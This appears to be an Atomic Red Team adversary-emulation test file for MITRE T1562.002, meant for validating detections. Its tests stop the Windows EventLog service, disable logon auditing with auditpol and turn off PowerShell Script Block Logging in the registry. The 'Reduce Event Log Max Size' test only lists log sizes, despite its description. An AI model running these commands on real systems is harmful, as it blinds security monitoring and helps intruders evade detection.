attack_technique: T1562.002
display_name: "Impair Defenses: Disable Windows Event Logging"
tactic: Defense Evasion
atomic_tests:
  - name: "Disable Event Log Service"
    auto_generated_guid: a7a7b7c7d7e7f7a8b8c8d8e8f8a9b9c9
    description: |
      Attempts to stop the Windows Event Log service.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        Get-Service EventLog | Select-Object Name,Status
        Stop-Service -Name EventLog -Force -ErrorAction SilentlyContinue
        Get-Service EventLog | Select-Object Name,Status
      cleanup_command: |
        Start-Service -Name EventLog -ErrorAction SilentlyContinue
      elevation_required: true

  - name: "Disable Security Event Logging via auditpol"
    auto_generated_guid: b8b8c8d8e8f8a9b9c9d9e9f9a0b0c0d0
    description: |
      Uses auditpol to disable security audit logging.
    supported_platforms:
      - windows
    executor:
      name: command_prompt
      command: |
        auditpol /get /category:*
        auditpol /set /subcategory:"Logon" /success:disable /failure:disable
      cleanup_command: |
        auditpol /set /subcategory:"Logon" /success:enable /failure:enable
      elevation_required: true

  - name: "Reduce Event Log Max Size"
    auto_generated_guid: c9c9d9e9f9a0b0c0d0e0f0a1b1c1d1e1
    description: |
      Reduces the maximum event log size to limit evidence retention.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        $logs = @("Security","System","Application","Windows PowerShell")
        foreach ($log in $logs) { $current = (Get-WinEvent -ListLog $log).MaximumSizeInBytes; Write-Output "$log`: $($current/1MB) MB" }
      elevation_required: false

  - name: "Disable PowerShell Script Block Logging"
    auto_generated_guid: d0d0e0f0a1b1c1d1e1f1a2b2c2d2e2f2
    description: |
      Disables PowerShell Script Block Logging via registry.
    supported_platforms:
      - windows
    executor:
      name: command_prompt
      command: |
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f
      cleanup_command: |
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
      elevation_required: true
